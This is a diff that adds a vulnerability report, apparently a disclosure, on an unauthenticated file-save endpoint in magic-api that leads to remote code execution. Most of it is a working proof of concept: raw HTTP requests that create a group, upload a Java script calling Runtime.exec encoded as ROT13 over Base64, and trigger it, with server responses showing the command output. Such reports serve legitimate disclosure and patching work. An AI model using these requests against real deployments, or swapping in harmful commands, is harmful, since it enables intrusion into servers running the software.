@@ -1,0 +1,88 @@
+Vulnerability Title: Unauthorized Creation Leads to RCE
+
+**Location**
+
+- `magic-api/.../core/web/MagicResourceController.java#L72-L83`: `/resource/file/{folder}/save` blocks `requireLogin` without `requireLogin`
+
+- `magic-api/.../core/service/impl/DefaultMagicResourceService.java#L501-L568`: `saveFile()`
+
+- `magic-api/.../core/service/MagicResourceStorage.java#L41-L57`: Request body format = `JSON + "\r\n=================================\r\n" + script`
+
+- `magic-api/.../utils/ROT13Utils.java#L50-L57`: Request body is `ROT13(Base64(plaintext))` `magic-api/.../core/service/impl/RequestMagicDynamicRegistry.java#L103-L119`: Register as a public HTTP interface immediately after saving.
+
+Step 1 Create a group
+
+Request package:
+POST /magic/web/resource/folder/save HTTP/1.1
+Host: 192.168.26.129:9999
+Content-Type: application/json
+Content-Length: 62
+
+{"name":"poc_repro","path":"poc_repro","type":"api","parentId":"0"}
+
+Return package:
+HTTP/1.1 200
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Credentials: true
+Access-Control-Allow-Methods: GET,POST,OPTIONS,PUT,DELETE
+Content-Type: application/json
+Transfer-Encoding: chunked
+Date: Tue, 13 Oct 2026 10:44:34 GMT
+
+{"code":1,"message":"success","data":"96f08ec026e24b57a7252584cfc91319","timestamp":1791888274063,"executeTime":null}
+
+Step 2: Write a malicious script (create/modify the same endpoint)
+Plaintext (=================================== Separated into two parts):
+
+{"id": "5a917b1a2c0c4d34ace77af969294522", "groupId": "96f08ec026e24b57a7252584cfc91319", "name": "cmd", "path": "cmd", "method": "GET", "parameters": [], "options": [], "headers": [], "paths": [], "description": "poc"}
+
+=================================
+import java.lang.Runtime;
+
+import java.util.Scanner;
+
+var p = Runtime.getRuntime().exec("id");
+
+var s = new Scanner(p.getInputStream()).useDelimiter("\\A");
+
+return s.hasNext() ? s.next() : "no-output";
+
+Encoded request body (complete, 608) (Character) rlWcMPV6VPV1LGxkA2VkLGWwZTZ0MQZ0LJAyAmquMwx2BGV5AQHlZvVfVPWapz91pRyxVwbtVwx2MwN4MJZjZwMyZwEvAGquAmV1ZwH4ATAzLmxkZmR5VvjtVz5uoJHvBvNvL21xVvjtVaOuqTtvBvN vL21xVvjtVz1yqTuiMPV6VPWUEIDvYPNvpTSlLJ1yqTIlplV6VSgqYPNvo3O0nJ9hplV6VSgqYPNv nTIuMTIlplV6VSgqYPNvpTS0nUZvBvOoKFjtVzEyp2AlnKO0nJ9hVwbtVaOiLlW9QDb9CG09CG09CG 09CG09CG09CG09CG09CG09CG09CD0XnJ1jo3W0VTcuqzRhoTShMl5FqJ50nJ1yBjccoKOipaDtnzS 2LF51qTyfYyAwLJ5hMKV7PaMupvOjVQ0tHaIhqTygMF5aMKEFqJ50nJ1yXPxhMKuyLltvnJDvXGfXq zSlVUZtCFOhMKptH2Auoz5ypvujYzqyqRyhpUI0H3ElMJSgXPxcYaImMHEyoTygnKEypvtvKSkOVvx7PaWyqUIlovOmYzuup05yrUDbXFN/VUZhozI4qPtcVQbtVz5iYJ91qUO1qPV7Pt==
+
+Request package:
+
+POST /magic/web/resource/file/api/save HTTP/1.1
+Host: 192.168.26.129:9999
+Content-Type: text/plain
+Content-Length: 608
+
+rlWcMPV6VPV1LGxkA2VkLGWwZTZ0MQZ0LJAyAmquMwx2BGV5AQHlZvVfVPWapz91pRyxVwbtVwx 2MwN4MJZjZwMyZwEvAGquAmV1ZwH4ATAzLmxkZmR5VvjtVz5uoJHvBvNvL21xVvjtVaOuqTtvBvN vL21xVvjtVz1yqTuiMPV6VPWUEIDvYPNvpTSlLJ1yqTIlplV6VSgqYPNvo3O0nJ9hplV6VSgqYPNvn TIuMTIlplV6VSgqYPNvpTS0nUZvBvOoKFjtVzEyp2AlnKO0nJ9hVwbtVaOiLlW9QDb9CG09CG09CG0 9CG09CG09CG09CG09CG09CG09CD0XnJ1jo3W0VTcuqzRhoTShMl5FqJ50nJ1yBjccoKOipaDtnzS2L F51qTyfYyAwLJ5hMKV7PaMupvOjVQ0tHaIhqTygMF5aMKEFqJ50nJ1yXPxhMKuyLltvnJDvXGfXqzS lVUZtCFOhMKptH2Auoz5ypvujYzqyqRyhpUI0H3ElMJSgXPxcYaImMHEyoTygnKEypvtvKSkOVvx7PaWyqUIlovOmYzuup05yrUDbXFN/VUZhozI4qPtcVQbtVz5iYJ91qUO1qPV7Pt==
+
+Return package:
+HTTP/1.1 200
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Credentials: true
+Access-Control-Allow-Methods: GET,POST,OPTIONS,PUT,DELETE
+Content-Type: application/json
+Transfer-Encoding: chunked
+Date: Tue, 13 Oct 2026 10:50:53 GMT
+
+{"code":1,"message":"success","data":"5a917b1a2c0c4d34ace77af969294522","timestamp":1791888653801,"executeTime":null}
+
+Step 3 Trigger execution (RCE)
+
+Request package:
+GET /poc_repro/cmd HTTP/1.1
+Host: 192.168.26.129:9999
+
+Return package:
+HTTP/1.1 200
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Credentials: true
+Access-Control-Allow-Methods: GET,POST,OPTIONS,PUT,DELETE
+Set-Cookie: JSESSIONID=12F625382ED3B3D7515F0086790A90F8; Path=/; HttpOnly
+Content-Type: application/json
+Transfer-Encoding: chunked
+Date: Tue, 13 Oct 2026 10:50:53 GMT
+
+{"code":1,"message":"success","data":"uid=1000(ai) gid=1000(ai) Group=1000(ai),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),10 2(scanner),112(bluetooth),117(lpadmin),119(wireshark),123(kaboxer),124(docker)\n","timestamp":1791888653872,"executeTime":10}
